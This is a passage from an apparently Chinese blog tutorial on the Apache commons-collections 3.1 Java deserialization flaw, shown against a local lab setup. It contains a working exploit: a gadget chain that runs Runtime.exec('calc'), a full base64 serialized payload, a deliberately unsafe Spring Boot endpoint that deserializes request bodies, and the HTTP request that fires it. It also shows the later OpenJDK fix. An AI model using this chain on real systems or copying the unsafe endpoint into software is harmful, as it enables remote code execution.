</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>, Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span>),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 把 Transformer 使用链的方式调用，从上到下，不用再每次执行</span>
</span></span><span style=display:flex><span>        Transformer transformerChain <span style=color:#f92672>=</span> ChainedTransformer.<span style=color:#a6e22e>getInstance</span>(transformers);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 利用 TransformedMap 的漏洞来执行 transform 方法</span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
</span></span><span style=display:flex><span>        innerMap.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;name&#34;</span>, <span style=color:#e6db74>&#34;守法市民小杜&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// TransformedMap 继承自 AbstractInputCheckedMapDecorator，Map 中的 元素会被转换为 AbstractInputCheckedMapDecorator.MapEntry</span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> outerMap <span style=color:#f92672>=</span> TransformedMap.<span style=color:#a6e22e>decorate</span>(innerMap, <span style=color:#66d9ef>null</span>, transformerChain);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// AbstractInputCheckedMapDecorator.MapEntry 在 setValue 时会先调用 parent.checkSetValue(value)，而 checkSetValue 会调用 valueTransformer 的 transform 方法</span>
</span></span><span style=display:flex><span>        outerMap.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;name&#34;</span>, <span style=color:#e6db74>&#34;法外狂徒张三&#34;</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><h2 id=笑里藏刀>笑里藏刀</h2><p>现在只差最后一步，需要找到一个类，用它创建一个对象并完成序列化，同时它还必须满足以下三个条件：</p><ol><li>实现了 <code>Serializable</code> 接口。</li><li>增加了 <code>readObject</code> 方法。</li><li>成员变量中有 <code>Map</code> 并且在 <code>readObject</code> 时对这个 <code>Map</code> 进行了 <code>put</code> 操作或操作了 <code>Map.Entry</code> 的 <code>setValue</code> 方法。</li></ol><p>安全人员在审查 <code>openjdk</code> 源码时发现了 <code>sun.reflect.annotation.AnnotationInvocationHandler</code>这个类 符合这个条件，只需用这个类创建一个对象，再将其序列化之后的内容发送到其他系统，即可完成漏洞利用。</p><p>但只局限于以下这几个版本</p><ul><li>openjdk 8 <a href=https://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java>https://hg.openjdk.java.net/jdk8/jdk8/jdk/file/687fd7c7986d/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a></li><li>openjdk 8u20 <a href=https://hg.openjdk.java.net/jdk8u/jdk8u20/jdk/file/f5d77a430a29/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java>https://hg.openjdk.java.net/jdk8u/jdk8u20/jdk/file/f5d77a430a29/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a></li><li>openjdk 8u40 <a href=https://hg.openjdk.java.net/jdk8u/jdk8u40/jdk/file/c7bbaa04eaa8/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java>https://hg.openjdk.java.net/jdk8u/jdk8u40/jdk/file/c7bbaa04eaa8/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a></li><li>openjdk 8u41 <a href=https://hg.openjdk.java.net/jdk8u/jdk8u41/jdk/file/4f0378ee824a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java>https://hg.openjdk.java.net/jdk8u/jdk8u41/jdk/file/4f0378ee824a/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a></li><li>openjdk 8u60 <a href=https://hg.openjdk.java.net/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java>https://hg.openjdk.java.net/jdk8u/jdk8u60/jdk/file/935758609767/src/share/classes/sun/reflect/annotation/AnnotationInvocationHandler.java</a></li></ul><p>其 <code>readObject</code> 方法如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span> <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> s)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>IOException</span>, ClassNotFoundException {
</span></span><span style=display:flex><span>        s.<span style=color:#a6e22e>defaultReadObject</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Check to make sure that types have not evolved incompatibly</span>
</span></span><span style=display:flex><span>        AnnotationType annotationType <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>            annotationType <span style=color:#f92672>=</span> AnnotationType.<span style=color:#a6e22e>getInstance</span>(type);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>catch</span>(IllegalArgumentException e) {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// Class is no longer an annotation type; time to punch out</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>InvalidObjectException</span>(<span style=color:#e6db74>&#34;Non-annotation type in annotation serial stream&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, Class<span style=color:#f92672>&lt;?&gt;&gt;</span> memberTypes <span style=color:#f92672>=</span> annotationType.<span style=color:#a6e22e>memberTypes</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, Class<span style=color:#f92672>&lt;?&gt;&gt;</span> memberTypes <span style=color:#f92672>=</span> annotationType.<span style=color:#a6e22e>memberTypes</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// If there are annotation members without values, that</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// situation is handled by the invoke method.</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (Map.<span style=color:#a6e22e>Entry</span><span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> memberValue : memberValues.<span style=color:#a6e22e>entrySet</span>()) {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// debug 发现这个 name 是一个固定值 &#34;value&#34; </span>
</span></span><span style=display:flex><span>            String name <span style=color:#f92672>=</span> memberValue.<span style=color:#a6e22e>getKey</span>();
</span></span><span style=display:flex><span>            Class<span style=color:#f92672>&lt;?&gt;</span> memberType <span style=color:#f92672>=</span> memberTypes.<span style=color:#a6e22e>get</span>(name);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (memberType <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {  <span style=color:#75715e>// i.e. member still exists</span>
</span></span><span style=display:flex><span>                Object value <span style=color:#f92672>=</span> memberValue.<span style=color:#a6e22e>getValue</span>();
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(memberType.<span style=color:#a6e22e>isInstance</span>(value) <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>                      value <span style=color:#66d9ef>instanceof</span> ExceptionProxy)) {
</span></span><span style=display:flex><span>                      <span style=color:#75715e>// 下面这行代码会触发</span>
</span></span><span style=display:flex><span>                    memberValue.<span style=color:#a6e22e>setValue</span>(
</span></span><span style=display:flex><span>                        <span style=color:#66d9ef>new</span> AnnotationTypeMismatchExceptionProxy(
</span></span><span style=display:flex><span>                            value.<span style=color:#a6e22e>getClass</span>() <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;[&#34;</span> <span style=color:#f92672>+</span> value <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;]&#34;</span>).<span style=color:#a6e22e>setMember</span>(
</span></span><span style=display:flex><span>                                annotationType.<span style=color:#a6e22e>members</span>().<span style=color:#a6e22e>get</span>(name)));
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>安全人员在 debug 时发现 <code>Map</code> 中的 <code>key</code> 为固定值 <code>"value"</code> ，因此我们需要将 <code>Map</code> 中的 <code>key</code> 修改为字符串 <code>"value"</code>，下面我们生成一个 <code>payload</code>。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.Transformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ChainedTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.ConstantTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.functors.InvokerTransformer;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.apache.commons.collections.map.TransformedMap;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ByteArrayOutputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.ObjectOutputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.annotation.Target;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Constructor;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.HashMap;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Map;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Exp3</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        Transformer<span style=color:#f92672>[]</span> transformers <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> Transformer<span style=color:#f92672>[]</span>{
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ConstantTransformer(Runtime.<span style=color:#a6e22e>class</span>),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;getMethod&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>, Class<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;getRuntime&#34;</span>, <span style=color:#66d9ef>null</span>}),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;invoke&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{Object.<span style=color:#a6e22e>class</span>, Object<span style=color:#f92672>[]</span>.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[</span>2<span style=color:#f92672>]</span>),
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> InvokerTransformer(<span style=color:#e6db74>&#34;exec&#34;</span>, <span style=color:#66d9ef>new</span> Class<span style=color:#f92672>[]</span>{String.<span style=color:#a6e22e>class</span>}, <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]</span>{<span style=color:#e6db74>&#34;calc&#34;</span>})
</span></span><span style=display:flex><span>        };
</span></span><span style=display:flex><span>        Transformer transformerChain <span style=color:#f92672>=</span> ChainedTransformer.<span style=color:#a6e22e>getInstance</span>(transformers);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 利用 TransformedMap 的漏洞来执行 transform 方法</span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> innerMap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> HashMap<span style=color:#f92672>&lt;&gt;</span>();
</span></span><span style=display:flex><span>        innerMap.<span style=color:#a6e22e>put</span>(<span style=color:#e6db74>&#34;value&#34;</span>, <span style=color:#e6db74>&#34;守法市民小杜&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// TransformedMap 继承自 AbstractInputCheckedMapDecorator，Map 中的 元素会被转换为 AbstractInputCheckedMapDecorator.MapEntry</span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, String<span style=color:#f92672>&gt;</span> outerMap <span style=color:#f92672>=</span> TransformedMap.<span style=color:#a6e22e>decorate</span>(innerMap, <span style=color:#66d9ef>null</span>, transformerChain);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// AbstractInputCheckedMapDecorator.MapEntry 在 setValue 时会先调用 parent.checkSetValue(value)，而 checkSetValue 会调用 valueTransformer 的 transform 方法</span>
</span></span><span style=display:flex><span><span style=color:#75715e>//        outerMap.put(&#34;value&#34;, &#34;法外狂徒张三&#34;);</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// AnnotationInvocationHandler 不是 public 类型的类，且没有公开的构造器方法，只能通过反射创建</span>
</span></span><span style=display:flex><span>        Class<span style=color:#f92672>&lt;?&gt;</span> cls <span style=color:#f92672>=</span> Class.<span style=color:#a6e22e>forName</span>(<span style=color:#e6db74>&#34;sun.reflect.annotation.AnnotationInvocationHandler&#34;</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 获取构造方法</span>
</span></span><span style=display:flex><span>        Constructor<span style=color:#f92672>&lt;?&gt;</span> constructor <span style=color:#f92672>=</span> cls.<span style=color:#a6e22e>getDeclaredConstructor</span>(Class.<span style=color:#a6e22e>class</span>, Map.<span style=color:#a6e22e>class</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 因为其构造方法不是 public</span>
</span></span><span style=display:flex><span>        constructor.<span style=color:#a6e22e>setAccessible</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 实例化对象</span>
</span></span><span style=display:flex><span>        Object target <span style=color:#f92672>=</span> constructor.<span style=color:#a6e22e>newInstance</span>(Target.<span style=color:#a6e22e>class</span>, outerMap);
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将对象序列化为字节数组</span>
</span></span><span style=display:flex><span>        ByteArrayOutputStream buffer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (ObjectOutputStream outputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(buffer)) {
</span></span><span style=display:flex><span>            outputStream.<span style=color:#a6e22e>writeObject</span>(target);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将字节数组进行base64编码，无论是通过网络或者是文件都可以发送到另一个系统进行反序列化</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> String data <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getEncoder</span>().<span style=color:#a6e22e>encodeToString</span>(buffer.<span style=color:#a6e22e>toByteArray</span>());
</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;payload: &#34;</span> <span style=color:#f92672>+</span> data);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>使用 <code>maven</code> 新建一个 <code>springboot</code> 项目来模拟目标环境，添加 <code>commons-collections 3.1</code> 的依赖，并增加一个接口如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.boot.SpringApplication;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.boot.autoconfigure.SpringBootApplication;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.PostMapping;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> org.springframework.web.bind.annotation.RestController;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.ServletInputStream;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.charset.StandardCharsets;
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@RestController</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>@SpringBootApplication</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>Application</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span>(String<span style=color:#f92672>[]</span> args) {
</span></span><span style=display:flex><span>        SpringApplication.<span style=color:#a6e22e>run</span>(Application.<span style=color:#a6e22e>class</span>, args);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>/**
</span></span></span><span style=display:flex><span><span style=color:#75715e>     * apache commons-collections 3.1 版本的反序列化漏洞
</span></span></span><span style=display:flex><span><span style=color:#75715e>     *
</span></span></span><span style=display:flex><span><span style=color:#75715e>     * @param request request
</span></span></span><span style=display:flex><span><span style=color:#75715e>     * @return 是否成功
</span></span></span><span style=display:flex><span><span style=color:#75715e>     * @throws Exception 异常
</span></span></span><span style=display:flex><span><span style=color:#75715e>     */</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@PostMapping</span>(<span style=color:#e6db74>&#34;/commons-collections-3.1&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> String <span style=color:#a6e22e>commonsCollections3_1</span>(HttpServletRequest request) <span style=color:#66d9ef>throws</span> Exception {
</span></span><span style=display:flex><span>        ServletInputStream inputStream <span style=color:#f92672>=</span> request.<span style=color:#a6e22e>getInputStream</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> StringBuilder sb <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> StringBuilder();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (BufferedReader bufferedReader <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> BufferedReader(<span style=color:#66d9ef>new</span> InputStreamReader(inputStream))) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>char</span><span style=color:#f92672>[]</span> charBuffer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span><span style=color:#f92672>[</span>1024<span style=color:#f92672>]</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>int</span> bytesRead;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>while</span> ((bytesRead <span style=color:#f92672>=</span> bufferedReader.<span style=color:#a6e22e>read</span>(charBuffer)) <span style=color:#f92672>&gt;</span> 0) {
</span></span><span style=display:flex><span>                sb.<span style=color:#a6e22e>append</span>(charBuffer, 0, bytesRead);
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 读取 request body 中的字符串</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> String requestBody <span style=color:#f92672>=</span> sb.<span style=color:#a6e22e>toString</span>();
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 使用 base64 解码</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> bytes <span style=color:#f92672>=</span> Base64.<span style=color:#a6e22e>getDecoder</span>().<span style=color:#a6e22e>decode</span>(requestBody.<span style=color:#a6e22e>getBytes</span>(StandardCharsets.<span style=color:#a6e22e>UTF_8</span>));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// 将字节数组反序列化为对象</span>
</span></span><span style=display:flex><span>        ByteArrayInputStream b <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayInputStream(bytes);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> (ObjectInputStream input <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(b)) {
</span></span><span style=display:flex><span>            Object obj <span style=color:#f92672>=</span> input.<span style=color:#a6e22e>readObject</span>();
</span></span><span style=display:flex><span>            System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(obj);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#e6db74>&#34;success&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>启动 <code>springboot</code> 服务。</p><p>最后增加一个发送 <code>http</code> 请求的测试，此步骤可以换<code>postman</code> 或者 <code>burp</code>，我这里是使用了 <code>IDEA</code> 自带的 http 请求工具进行测试</p><pre tabindex=0><code>### 发送POST 请求
POST http://localhost:8080/commons-collections-3.1

rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzcgAxb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5UcmFuc2Zvcm1lZE1hcGF3P+Bd8VpwAwACTAAOa2V5VHJhbnNmb3JtZXJ0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO0wAEHZhbHVlVHJhbnNmb3JtZXJxAH4ABXhwcHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAARzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAEWphdmEubGFuZy5SdW50aW1lAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAACdAAKZ2V0UnVudGltZXB0AAlnZXRNZXRob2R1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAJ2cgAQamF2YS5sYW5nLlN0cmluZ6DwpDh6O7NCAgAAeHB2cQB+ABpzcQB+ABF1cQB+ABYAAAACcHB0AAZpbnZva2V1cQB+ABoAAAACdnIAEGphdmEubGFuZy5PYmplY3QAAAAAAAAAAAAAAHhwdnEAfgAWc3EAfgARdXEAfgAWAAAAAXQABGNhbGN0AARleGVjdXEAfgAaAAAAAXEAfgAdc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AAV2YWx1ZXQAEuWuiOazleW4guawkeWwj+adnHh4dnIAG2phdmEubGFuZy5hbm5vdGF0aW9uLlRhcmdldAAAAAAAAAAAAAAAeHA=
</code></pre><p>请求发送成功，便可以看到电脑打开了计算器。</p><h2 id=注>注</h2><p>文中测试使用系统和工具版本如下：</p><ul><li><strong>操作系统</strong> windows 10 20H2</li><li><strong>jdk</strong> openjdk 8u40</li><li><strong>springboot</strong> 2.5.5</li><li><strong>commons-collections</strong> 3.1</li><li><strong>代码仓库</strong> <a href=https://github.com/dushixiang/java-serialization-vulnerability>https://github.com/dushixiang/java-serialization-vulnerability</a></li></ul><h2 id=其他>其他</h2><p>在最新的 <code>openjdk 8u</code> 中则修复了这个问题，代码如下：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>private</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> s)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>throws</span> java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>IOException</span>, ClassNotFoundException {
</span></span><span style=display:flex><span>        ... 省略
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, Class<span style=color:#f92672>&lt;?&gt;&gt;</span> memberTypes <span style=color:#f92672>=</span> annotationType.<span style=color:#a6e22e>memberTypes</span>();
</span></span><span style=display:flex><span>        <span style=color:#75715e>// consistent with runtime Map type</span>
</span></span><span style=display:flex><span>        Map<span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> mv <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> LinkedHashMap<span style=color:#f92672>&lt;&gt;</span>();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// If there are annotation members without values, that</span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// situation is handled by the invoke method.</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>for</span> (Map.<span style=color:#a6e22e>Entry</span><span style=color:#f92672>&lt;</span>String, Object<span style=color:#f92672>&gt;</span> memberValue : streamVals.<span style=color:#a6e22e>entrySet</span>()) {
</span></span><span style=display:flex><span>            String name <span style=color:#f92672>=</span> memberValue.<span style=color:#a6e22e>getKey</span>();
</span></span><span style=display:flex><span>            Object value <span style=color:#f92672>=</span> <span style=color:#66d9ef>null</span>;
</span></span><span style=display:flex><span>            Class<span style=color:#f92672>&lt;?&gt;</span> memberType <span style=color:#f92672>=</span> memberTypes.<span style=color:#a6e22e>get</span>(name);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (memberType <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span>) {  <span style=color:#75715e>// i.e. member still exists</span>
</span></span><span style=display:flex><span>                value <span style=color:#f92672>=</span> memberValue.<span style=color:#a6e22e>getValue</span>();
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>(memberType.<span style=color:#a6e22e>isInstance</span>(value) <span style=color:#f92672>||</span>
</span></span><span style=display:flex><span>                      value <span style=color:#66d9ef>instanceof</span> ExceptionProxy)) {
</span></span><span style=display:flex><span>                    value <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> AnnotationTypeMismatchExceptionProxy(
